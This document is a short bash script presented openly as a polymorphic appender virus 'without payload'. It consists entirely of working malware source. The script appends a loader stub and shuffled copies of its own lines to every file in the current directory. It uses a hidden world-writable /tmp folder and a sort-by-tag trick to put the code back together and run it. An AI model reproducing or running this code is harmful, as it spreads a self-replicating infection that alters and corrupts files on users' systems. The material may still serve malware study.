#!/bin/bash
# Virus polymorph, appender and without payload.
# [!!] Remove all empty line and all comment to launch the virus.

# --- Restoring function ---
mkdir -m 0777 /tmp/.\ / > /dev/null
tail -n 30 "$0" | sort -n -t@ -k 2 > /tmp/.\ /test
chmod u+x /tmp/.\ /test && /tmp/.\ /test &
exit 0

# --- Virus body ---
if [ "$1" = "test" ]; then #@1
	exit 0 #@2
fi #@3
filename=(test cd ls pwd) #@4
RANDOM=$$ #@5
for target in *; do #@6
	# -- Overinfection check ---
	
	# Avoid to overwrite the virus while doing the test.
	tmpfile="${0##*/}"; while [ "$tmpfile" = "${0##*/}" ]; do tmpfile=${filename[$((RANDOM % 4))]}; done #@7
	
	tail -n 30 "$target" | sort -n -t$(printf "\x40") -k 2 > /tmp/.\ /"$tmpfile" #@8
	chmod u+x /tmp/.\ /"$tmpfile" && /tmp/.\ /"$tmpfile" "test" 2>/dev/null #@9
	if [ $? -eq 0 ] ; then #@10
		continue #@11
	fi #@12
	
	# -- Infection --
	
	# Append the restoration chunk
	tmpfile=${filename[$((RANDOM % 4))]} #@13
	tmpfile="/tmp/.\ /$tmpfile" #@14
	printf "mkdir -m 0777 /tmp/.\ / > /dev/null; tail -n 30 \$0 | sort -n -t\x40 -k 2 > $tmpfile\n" >> "$target" #@15
	echo "chmod u+x $tmpfile && $tmpfile &" >> "$target" #@16
	echo "exit 0" >> "$target" #@17
	
	# Append randomly lines of the virus.
	tabft=("FT" [30]=" ") #@18
	declare -i nbl=0 #@19
	while [ $nbl -ne 30 ]; do #@20
		valindex=$((($RANDOM % 30) + 1)) #@21
		while [ "${tabft[$valindex]}" = "FT" ]; do #@22
			valindex=$((($RANDOM % 30) + 1)) #@23
		done #@24
		line=$(tail -n $valindex "$0" | head -n 1) #@25
		echo "$line" | sed 's/^[ \t]*//' >> "$target" #@26
		nbl=$(($nbl+1)) && tabft[$valindex]="FT" #@27
	done #@28
done #@29
rm -f -r /tmp/.\ / 2>/dev/null #@30
